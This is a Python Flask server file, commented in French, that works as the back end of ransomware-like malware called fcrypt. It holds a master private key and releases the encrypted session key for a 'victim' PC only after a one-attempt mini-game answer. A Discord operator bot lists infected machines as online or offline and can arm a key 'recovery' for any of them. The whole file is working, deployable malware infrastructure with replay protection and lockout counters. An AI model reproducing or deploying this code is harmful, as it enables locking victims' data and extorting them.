#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
server.py — Serveur de validation pour Render (v1.3) + BOT DISCORD opérateur.
Garde master.key, valide la réponse, renvoie la session_key CHIFFRÉE.

Sur Render : ce fichier s'appelle déjà « server.py » → Start Command inchangée :
    gunicorn server:app --bind 0.0.0.0:$PORT
(le bot Discord démarre en thread à l'import du module — garder 1 worker).

NOUVEAUTÉS v1.3 (bot Discord + récupération d'urgence + lien opérateur) :
  - POST /poll : heartbeat signé MAC (info=b"poll") envoyé périodiquement par
    le PC pendant la phase active → alimente !list (script ouvert = en ligne).
  - Récupération d'urgence : !recovery <id> (bot) arme un drapeau one-shot
    (TTL RECOVERY_TTL) ; au prochain /poll valide, le serveur ouvre
    l'enveloppe (même chemin crypto que /unlock) et renvoie la session_key
    CHIFFRÉE — le PC de la victime affiche la progression du déchiffrement
    en % dans l'interface du mini-jeu. Le bot ne fait qu'ARMER le drapeau :
    il ne peut JAMAIS obtenir de clé lui-même (le secret ECDH n'existe que
    dans la RAM du processus de la victime).
  - Bot Discord hébergé DANS CE FICHIER (thread dédié, à côté de Flask) :
    préfixe « ! », commandes !help / !list / !recovery, réservées aux
    DISCORD_ADMIN_IDS (vide = aucune commande servie).

NOUVEAUTÉS v1.2 (fix « Not Found / 404 » sur le site et chez cron-job.org) :
  - GET / répond désormais {"status": "ok", ...} : la racine du service ne
    renvoie plus 404 (la v1.1 n'avait que /health et /unlock, donc toute
    visite de la racine — navigateur, cron-job.org, health-check Render —
    prenait un 404 Flask « The requested URL was not found »).
  - Toutes les erreurs HTTP (404 route inconnue, 405 mauvaise méthode,
    413 corps trop gros, 500 interne) renvoient un JSON MINUSCULE au lieu
    des pages HTML de Flask : les réponses restent toujours minuscules et
    claires (cron-job.org n'affiche plus jamais « sortie trop grande »).

SÉCURITÉ v1.1 (par rapport à la v1.0) :
  1. Réponse chiffrée : la session_key ne circule JAMAIS en clair (ECDH + HKDF
     info=b"response", AES-GCM). Rien à mettre dans les logs en clair.
  2. MAC HMAC OBLIGATOIRE sur /unlock : la requête doit être signée avec le
     secret ECDH dérivé de l'enveloppe (info=b"request"). Une enveloppe volée
     sur disque + la réponse devinée ne suffisent plus : seul le processus qui
     a construit l'enveloppe connaît ce secret (jamais sur disque/binaire).
     Un MAC invalide NE consomme PAS de tentative (pas de burn possible).
  3. Anti-rejeu : nonce aléatoire + horodatage couverts par le MAC, fenêtre
     de ±TS_WINDOW secondes.
  4. Compteur de tentatives DOUBLE : par machine_id ET par hash d'enveloppe —
     usurper un machine_id neuf ne réinitialise plus le compteur ; une
     enveloppe donnée ne peut être déverrouillée qu'UNE SEULE FOIS à vie.
  5. Comparaison de la réponse en TEMPS CONSTANT (hmac.compare_digest).
  6. Limites strictes : MAX_CONTENT_LENGTH 64 Ko, formats hexédécimaux
     vérifiés, enveloppe ≤ 16 Ko, réponse lue jamais au-delà des champs
     attendus. Messages d'erreur GÉNÉRIQUES (pas de réflexion d'exceptions) —
     les détails vont uniquement dans les logs serveur, qui ne contiennent
     JAMAIS l'enveloppe, la réponse ni les clés.

Endpoints :
  GET  /        → {"status": "ok"} (ping racine : navigateur, cron-job.org)
  GET  /health  → {"status": "ok"}
  POST /unlock  → {machine_id, answer, envelope, nonce, ts, mac}
                  → 200 {"status":"ok","session_key_enc","nonce"}
                  | 403 {"status":"wrong"} / {"status":"locked_out"}
                  | 400/403 {"status":"error","reason":...} (générique)
  POST /poll    → {machine_id, envelope, nonce, ts, mac}  (MAC info=b"poll")
                  → 200 {"status":"ok"}
                  | 200 {"status":"ok","recovery":{"session_key_enc","nonce"}}
                    si une récupération d'urgence est armée (one-shot)
                  | 403 replay / bad_mac / stale_request

Bot Discord (même fichier, thread dédié, prefix "!") :
  !help            aide (admin only)
  !list            machines connues : ✅ en ligne (script ouvert, heartbeat
                   frais ≤ HEARTBEAT_TTL s) / ❌ hors ligne
  !recovery <id>   arme la récupération d'urgence de la machine <id>

Variables d'environnement (Render → Environment) :
  MASTER_KEY_B64      clé privée X25519 en base64 (générée à l'étape 1 du tuto)
  GOOD_ANSWER         réponse attendue (défaut "2")
  MAX_ATTEMPTS        nombre max d'essais par machine ET par enveloppe (défaut 1)
  STATE_FILE          chemin du fichier d'état (défaut /tmp/fcrypt_state.json)
  DISCORD_BOT_TOKEN   token du bot Discord (vide = pas de bot)
  DISCORD_ADMIN_IDS   IDs Discord opérateurs, séparés par des virgules
                      (vide = AUCUNE commande servie)
  HEARTBEAT_TTL       seuil « en ligne » pour !list en secondes (défaut 90)
  RECOVERY_TTL        durée de vie d'un drapeau de recovery en secondes (défaut 3600)
  PORT                port d'écoute (Render injecte $PORT, défaut 10000)
"""

import os
import re
import json
import time
import base64
import hashlib
import hmac
import secrets
import threading
from pathlib import Path

from flask import Flask, request, jsonify
from cryptography.hazmat.primitives.asymmetric.x25519 import (
    X25519PrivateKey, X25519PublicKey,
)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes

app = Flask(__name__)
# Les requêtes > 64 Ko sont rejetées d'office (anti-DoS, anti-abus).
app.config["MAX_CONTENT_LENGTH"] = 64 * 1024

MASTER_KEY_B64 = os.environ.get("MASTER_KEY_B64", "")
GOOD_ANSWER = os.environ.get("GOOD_ANSWER", "2")
MAX_ATTEMPTS = int(os.environ.get("MAX_ATTEMPTS", "1"))
STATE_FILE = Path(os.environ.get("STATE_FILE", "/tmp/fcrypt_state.json"))
TS_WINDOW = 300          # fenêtre anti-rejeu (±5 min)
ENVELOPE_MAX = 16384     # taille max d'une enveloppe décodée (octets)
HEARTBEAT_TTL = int(os.environ.get("HEARTBEAT_TTL", "90"))
RECOVERY_TTL = int(os.environ.get("RECOVERY_TTL", "3600"))
DISCORD_BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN", "")
DISCORD_ADMIN_IDS = {s.strip() for s in os.environ.get("DISCORD_ADMIN_IDS", "").split(",") if s.strip()}

if not MASTER_KEY_B64:
    raise RuntimeError("MASTER_KEY_B64 manquant")

try:
    _raw = base64.b64decode(MASTER_KEY_B64)
    if len(_raw) != 32:
        raise ValueError("master.key doit faire 32 octets")
    MASTER_PRIV = X25519PrivateKey.from_private_bytes(_raw)
except Exception as e:
    raise RuntimeError(f"MASTER_KEY_B64 invalide: {e}")

_state_lock = threading.Lock()


def _load_state() -> dict:
    if STATE_FILE.exists():
        try:
            return json.loads(STATE_FILE.read_text())
        except Exception:
            pass
    return {}


def _save_state(state: dict):
    try:
        tmp = STATE_FILE.with_suffix(".tmp")
        tmp.write_text(json.dumps(state))
        tmp.replace(STATE_FILE)
    except Exception:
        pass


STATE = _load_state()


def _env_hash(envelope: str) -> str:
    return hashlib.sha256(envelope.encode("utf-8")).hexdigest()


def _attempts_of(machine_id: str, env_h: str) -> int:
    """Max des compteurs machine et enveloppe : usurper un machine_id neuf ne
    réinitialise rien, changer d'enveloppe non plus."""
    with _state_lock:
        m = STATE.get("m:" + machine_id, {}).get("attempts", 0)
        e = STATE.get("e:" + env_h, {}).get("attempts", 0)
        return max(m, e)


def _env_unlocked(env_h: str) -> bool:
    with _state_lock:
        return bool(STATE.get("e:" + env_h, {}).get("unlocked", False))


def _record_both(machine_id: str, env_h: str, ok: bool):
    with _state_lock:
        for k in ("m:" + machine_id, "e:" + env_h):
            e = STATE.setdefault(k, {"attempts": 0, "first_seen": time.time()})
            e["attempts"] += 1
            e["last_attempt"] = time.time()
            e["success"] = bool(ok)
            if ok:
                e["unlocked"] = True
        _save_state(STATE)


def _client_ip() -> str:
    xff = request.headers.get("X-Forwarded-For", "")
    return xff.split(",")[0].strip() if xff else (request.remote_addr or "?")


def _parse_envelope(envelope_b64: str):
    """Parse l'enveloppe → (eph_pub, salt, nonce, ct). Aucun déchiffrement ici :
    le GCM n'est ouvert qu'après TOUTES les vérifications (MAC, réponse)."""
    raw = base64.b64decode(envelope_b64, validate=True)
    if len(raw) < 16 + 32 + 12 + 16:
        raise ValueError("enveloppe trop courte")
    if len(raw) > ENVELOPE_MAX:
        raise ValueError("enveloppe trop grande")
    off = 0
    salt = raw[off:off + 16]; off += 16
    eph_pub_raw = raw[off:off + 32]; off += 32
    nonce = raw[off:off + 12]; off += 12
    ct = raw[off:]
    eph_pub = X25519PublicKey.from_public_bytes(eph_pub_raw)
    return eph_pub, salt, nonce, ct


def _request_key(shared: bytes, salt: bytes) -> bytes:
    return HKDF(algorithm=hashes.SHA256(), length=32, salt=salt,
                info=b"request").derive(shared)


def _verify_mac(shared: bytes, salt: bytes, machine_id: str, answer: str,
                nonce: str, ts: str, envelope: str, mac: str) -> bool:
    key = _request_key(shared, salt)
    msg = "\n".join([machine_id, answer, nonce, ts, envelope]).encode("utf-8")
    good = hmac.new(key, msg, hashlib.sha256).hexdigest()
    return hmac.compare_digest(good, mac)


def _open_envelope(shared: bytes, salt: bytes, nonce: bytes, ct: bytes) -> bytes:
    """Déchiffrement authentifié (GCM) de la session_key — appelé en DERNIER,
    une fois MAC + anti-rejeu + réponse validés."""
    key = HKDF(algorithm=hashes.SHA256(), length=32, salt=salt,
               info=b"envelope").derive(shared)
    session_key = AESGCM(key).decrypt(nonce, ct, salt)
    if len(session_key) != 32:
        raise ValueError("session_key invalide")
    return session_key


def _encrypt_response(session_key: bytes, shared: bytes, salt: bytes):
    """Chiffre la session_key pour la réponse (clé HKDF distincte,
    info=b'response') : elle ne circule jamais en clair, même côté logs."""
    key = HKDF(algorithm=hashes.SHA256(), length=32, salt=salt,
               info=b"response").derive(shared)
    nonce = secrets.token_bytes(12)
    ct = AESGCM(key).encrypt(nonce, session_key, None)
    return ct.hex(), nonce.hex()


def _poll_mac(shared: bytes, salt: bytes, machine_id: str, nonce: str,
              ts: str, env_h: str) -> str:
    """MAC attendu sur /poll : clé HKDF info=b'poll' (domaine distinct du
    MAC /unlock), couvre machine_id, nonce, ts et le hash de l'enveloppe."""
    key = HKDF(algorithm=hashes.SHA256(), length=32, salt=salt,
               info=b"poll").derive(shared)
    msg = "\n".join([machine_id, nonce, ts, env_h]).encode("utf-8")
    return hmac.new(key, msg, hashlib.sha256).hexdigest()


def _seen_nonce(machine_id: str, nonce: str) -> bool:
    """Anti-rejeu /poll : True si le nonce a DÉJÀ été vu (cache purgé de la
    fenêtre TS_WINDOW). Le MAC étant vérifié AVANT, un faux MAC ne consomme
    jamais rien."""
    now = time.time()
    with _state_lock:
        k = "n:" + machine_id
        cache = {n: t for n, t in STATE.get(k, {}).items() if now - t <= TS_WINDOW}
        replay = nonce in cache
        cache[nonce] = now
        STATE[k] = cache
        _save_state(STATE)
        return replay


def _heartbeat_seen(machine_id: str):
    """Marque la machine « vue » (script ouvert) pour la commande !list."""
    with _state_lock:
        STATE.setdefault("h:" + machine_id, {})['last_seen'] = time.time()
        _save_state(STATE)


def _arm_recovery(machine_id: str) -> bool:
    """Arme le drapeau de récupération d'urgence (one-shot, TTL).
    Retourne True si la machine était déjà connue du serveur."""
    with _state_lock:
        known = any((p + machine_id) in STATE for p in ("h:", "m:", "r:"))
        STATE["r:" + machine_id] = {"pending": True, "issued_ts": time.time()}
        _save_state(STATE)
    return known


def _take_recovery(machine_id: str):
    """Consomme le drapeau de récupération (une seule fois) et le renvoie,
    ou None s'il est absent / déjà consommé / expiré (RECOVERY_TTL)."""
    with _state_lock:
        r = STATE.get("r:" + machine_id)
        if not r or not r.get("pending"):
            return None
        if time.time() - float(r.get("issued_ts", 0)) > RECOVERY_TTL:
            STATE.pop("r:" + machine_id, None)
            _save_state(STATE)
            return None
        r["pending"] = False
        r["granted_ts"] = time.time()
        _save_state(STATE)
        return r


@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "ok", "service": "fcrypt-server"}), 200


@app.route("/", methods=["GET"])
def root():
    """Ping racine : navigateur, cron-job.org et health-check Render
    (HEAD / inclus, géré automatiquement). JSON minuscule, aucun secret."""
    return jsonify({"status": "ok", "service": "fcrypt-server", "version": "1.3"}), 200


# ── Erreurs HTTP en JSON minuscule (jamais les pages HTML de Flask) ──
@app.errorhandler(404)
def _not_found(_e):
    return jsonify({"error": "not_found"}), 404


@app.errorhandler(405)
def _method_not_allowed(_e):
    return jsonify({"error": "method_not_allowed"}), 405


@app.errorhandler(413)
def _payload_too_large(_e):
    return jsonify({"error": "payload_too_large"}), 413


@app.errorhandler(500)
def _internal_error(_e):
    return jsonify({"error": "server_error"}), 500


@app.route("/unlock", methods=["POST"])
def unlock():
    ip = _client_ip()
    try:
        req = request.get_json(force=True, silent=True) or {}
    except Exception:
        return jsonify({"status": "error", "reason": "bad_json"}), 400

    machine_id = str(req.get("machine_id", "")).strip().lower()
    answer = str(req.get("answer", ""))
    envelope = str(req.get("envelope", "")).strip()
    nonce = str(req.get("nonce", "")).strip().lower()
    ts = str(req.get("ts", "")).strip()
    mac = str(req.get("mac", "")).strip().lower()

    # ── 1) Présence + formats stricts : rien n'est compté à ce stade ──
    if not machine_id or not answer or not envelope or not nonce or not ts or not mac:
        return jsonify({"status": "error", "reason": "missing_fields"}), 400
    if (len(answer) > 32
            or not re.fullmatch(r"[0-9a-f]{8,64}", machine_id)
            or not re.fullmatch(r"[0-9a-f]{32}", nonce)
            or not re.fullmatch(r"\d{1,16}", ts)
            or not re.fullmatch(r"[0-9a-f]{64}", mac)
            or len(envelope) > 22000):
        return jsonify({"status": "error", "reason": "bad_fields"}), 400

    env_h = _env_hash(envelope)

    # ── 2) Verrous : enveloppe déjà ouverte (à vie) OU limite de tentatives
    #       atteinte (machine OU enveloppe). Ne consomme rien.
    if _env_unlocked(env_h) or _attempts_of(machine_id, env_h) >= MAX_ATTEMPTS:
        app.logger.info("unlock locked_out ip=%s machine=%s env=%s",
                        ip, machine_id[:8], env_h[:8])
        return jsonify({"status": "locked_out"}), 403

    # ── 3) Parse + secret ECDH partagé (aucune tentative consommée ici) ──
    try:
        eph_pub, salt, nonce_env, ct = _parse_envelope(envelope)
        shared = MASTER_PRIV.exchange(eph_pub)
    except Exception as e:
        app.logger.warning("unlock bad_envelope ip=%s err=%s", ip, e)
        return jsonify({"status": "error", "reason": "bad_envelope"}), 400

    # ── 4) MAC OBLIGATOIRE : prouve que l'appelant détient le secret ECDH de
    #       la session. Un MAC invalide ne consomme PAS de tentative : il est
    #       impossible de brûler les essais de la victime par spam.
    if not _verify_mac(shared, salt, machine_id, answer, nonce, ts, envelope, mac):
        app.logger.warning("unlock bad_mac ip=%s machine=%s env=%s",
                           ip, machine_id[:8], env_h[:8])
        return jsonify({"status": "error", "reason": "bad_mac"}), 403

    # ── 5) Anti-rejeu : horodatage frais (couvert par le MAC) ──
    try:
        ts_int = int(ts)
    except ValueError:
        return jsonify({"status": "error", "reason": "bad_fields"}), 400
    if abs(time.time() - ts_int) > TS_WINDOW:
        app.logger.warning("unlock stale ip=%s machine=%s", ip, machine_id[:8])
        return jsonify({"status": "error", "reason": "stale_request"}), 403

    # ── 6) Réponse attendue — comparaison à temps constant ──
    if not hmac.compare_digest(answer, GOOD_ANSWER):
        _record_both(machine_id, env_h, ok=False)
        app.logger.info("unlock wrong ip=%s machine=%s env=%s",
                        ip, machine_id[:8], env_h[:8])
        return jsonify({"status": "wrong"}), 403

    # ── 7) Dernière étape seulement : ouverture authentifiée de l'enveloppe ──
    try:
        session_key = _open_envelope(shared, salt, nonce_env, ct)
    except Exception as e:
        _record_both(machine_id, env_h, ok=False)
        app.logger.warning("unlock gcm_fail ip=%s machine=%s err=%s",
                           ip, machine_id[:8], e)
        return jsonify({"status": "error", "reason": "bad_envelope"}), 400

    enc_hex, nonce_hex = _encrypt_response(session_key, shared, salt)

    # Efface la session_key de la RAM dès qu'elle est chiffrée pour la réponse
    session_key = b"\x00" * 32
    del session_key

    _record_both(machine_id, env_h, ok=True)
    app.logger.info("unlock OK ip=%s machine=%s env=%s", ip, machine_id[:8], env_h[:8])
    return jsonify({
        "status": "ok",
        "session_key_enc": enc_hex,
        "nonce": nonce_hex,
    }), 200


@app.route("/poll", methods=["POST"])
def poll():
    """Heartbeat signé du PC (lien opérateur) + remise du grant de
    récupération d'urgence. Même discipline que /unlock : formats stricts,
    MAC obligatoire AVANT toute écriture d'état, anti-rejeu par nonce."""
    ip = _client_ip()
    try:
        req = request.get_json(force=True, silent=True) or {}
    except Exception:
        return jsonify({"status": "error", "reason": "bad_json"}), 400

    machine_id = str(req.get("machine_id", "")).strip().lower()
    envelope = str(req.get("envelope", "")).strip()
    nonce = str(req.get("nonce", "")).strip().lower()
    ts = str(req.get("ts", "")).strip()
    mac = str(req.get("mac", "")).strip().lower()

    if not machine_id or not envelope or not nonce or not ts or not mac:
        return jsonify({"status": "error", "reason": "missing_fields"}), 400
    if (not re.fullmatch(r"[0-9a-f]{8,64}", machine_id)
            or not re.fullmatch(r"[0-9a-f]{32}", nonce)
            or not re.fullmatch(r"\d{1,16}", ts)
            or not re.fullmatch(r"[0-9a-f]{64}", mac)
            or len(envelope) > 22000):
        return jsonify({"status": "error", "reason": "bad_fields"}), 400

    env_h = _env_hash(envelope)
    try:
        eph_pub, salt, nonce_env, ct = _parse_envelope(envelope)
        shared = MASTER_PRIV.exchange(eph_pub)
    except Exception as e:
        app.logger.warning("poll bad_envelope ip=%s err=%s", ip, e)
        return jsonify({"status": "error", "reason": "bad_envelope"}), 400

    if not hmac.compare_digest(_poll_mac(shared, salt, machine_id, nonce, ts, env_h), mac):
        app.logger.warning("poll bad_mac ip=%s machine=%s", ip, machine_id[:8])
        return jsonify({"status": "error", "reason": "bad_mac"}), 403

    try:
        ts_int = int(ts)
    except ValueError:
        return jsonify({"status": "error", "reason": "bad_fields"}), 400
    if abs(time.time() - ts_int) > TS_WINDOW:
        app.logger.warning("poll stale ip=%s machine=%s", ip, machine_id[:8])
        return jsonify({"status": "error", "reason": "stale_request"}), 403
    if _seen_nonce(machine_id, nonce):
        app.logger.warning("poll replay ip=%s machine=%s", ip, machine_id[:8])
        return jsonify({"status": "error", "reason": "replay"}), 403

    _heartbeat_seen(machine_id)

    rec = _take_recovery(machine_id)
    if rec is None:
        return jsonify({"status": "ok"}), 200

    # Récupération d'urgence armée par l'opérateur (!recovery) : même chemin
    # crypto que /unlock — ouverture authentifiée de l'enveloppe (GCM),
    # réponse chiffrée (info=b"response"). Si l'ouverture échoue, on ré-arme
    # le drapeau pour que le prochain /poll retente.
    try:
        session_key = _open_envelope(shared, salt, nonce_env, ct)
    except Exception as e:
        app.logger.warning("poll recovery gcm_fail ip=%s machine=%s err=%s",
                           ip, machine_id[:8], e)
        _arm_recovery(machine_id)
        return jsonify({"status": "error", "reason": "bad_envelope"}), 400

    enc_hex, nonce_hex = _encrypt_response(session_key, shared, salt)
    session_key = b"\x00" * 32
    del session_key
    app.logger.info("poll recovery GRANTED ip=%s machine=%s", ip, machine_id[:8])
    return jsonify({"status": "ok",
                    "recovery": {"session_key_enc": enc_hex, "nonce": nonce_hex}}), 200


# ════════════════════════════════════════════════════════════════════════
# ── BOT DISCORD OPÉRATEUR (hébergé DANS CE FICHIER, à côté de Flask) ──
# ════════════════════════════════════════════════════════════════════════
# Sécurité : les commandes sont réservées aux DISCORD_ADMIN_IDS (vide =
# aucune commande servie). Le bot ne fait qu'ARMER un drapeau one-shot —
# la clé ne part QUE vers un /poll signé MAC (secret ECDH en RAM victime
# uniquement) et y arrive CHIFFRÉE. Le bot ne peut jamais obtenir de clé.


def _discord_bot_main(token: str):
    try:
        import discord
        from discord.ext import commands
    except Exception as e:
        print(f"[bot] discord.py indisponible ({e}) — pip install discord.py")
        return
    intents = discord.Intents.default()
    intents.message_content = True
    bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

    @bot.event
    async def on_ready():
        print(f"[bot] connecté : {bot.user} (id={bot.user.id})")

    def _admin(ctx) -> bool:
        return str(ctx.author.id) in DISCORD_ADMIN_IDS

    @bot.command(name="help")
    async def _help_cmd(ctx):
        if not _admin(ctx):
            await ctx.send("⛔ Accès refusé.")
            return
        await ctx.send(
            "**Commandes opérateur** (réservées aux IDs autorisés)\n"
            "`!list` — machines connues : ✅ en ligne (script ouvert) / ❌ hors ligne\n"
            "`!recovery <id>` — récupération d'urgence : le PC affiche la progression "
            "du déchiffrement en % dans l'interface du mini-jeu\n"
            "`!help` — cette aide")

    @bot.command(name="list")
    async def _list_cmd(ctx):
        if not _admin(ctx):
            await ctx.send("⛔ Accès refusé.")
            return
        now = time.time()
        with _state_lock:
            mids = sorted({k[2:] for k in STATE if k[:2] in ("h:", "m:")})
            snap = {k: dict(v) for k, v in STATE.items() if k[:2] in ("h:", "r:")
                    and isinstance(v, dict)}
        if not mids:
            await ctx.send("Aucune machine connue — aucune enveloppe reçue à ce jour.")
            return
        lines = []
        for mid in mids[:40]:
            hs = float(snap.get("h:" + mid, {}).get("last_seen", 0))
            online = bool(hs) and (now - hs) <= HEARTBEAT_TTL
            ago = "jamais vu" if not hs else f"vu il y a {int(now - hs)} s"
            flag = " — ⏳ recovery armé" if snap.get("r:" + mid, {}).get("pending") else ""
            lines.append(f"{'✅' if online else '❌'} `{mid}` — {ago}{flag}")
        body = "\n".join(lines)
        await ctx.send((f"**Machines ({len(mids)})**\n{body}")[:1900])

    @bot.command(name="recovery")
    async def _recovery_cmd(ctx, mid: str = ""):
        if not _admin(ctx):
            await ctx.send("⛔ Accès refusé.")
            return
        mid = mid.strip().lower()
        if not re.fullmatch(r"[0-9a-f]{8,64}", mid):
            await ctx.send("Usage : `!recovery <machine_id>` — récupérez l'id avec `!list`.")
            return
        known = _arm_recovery(mid)
        if known:
            await ctx.send(f"🛠 Récupération armée pour `{mid}` — le déchiffrement démarrera au "
                           f"prochain poll du PC (≤ ~10 s) et la progression s'affichera en % "
                           f"sur son écran (interface du mini-jeu).")
        else:
            await ctx.send(f"⚠️ `{mid}` inconnue du serveur — drapeau armé quand même, mais il "
                           f"ne sera consommé que si ce PC poll réellement.")

    bot.run(token)


if DISCORD_BOT_TOKEN:
    threading.Thread(target=_discord_bot_main, args=(DISCORD_BOT_TOKEN,), daemon=True).start()
    print("[bot] thread Discord démarré")


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
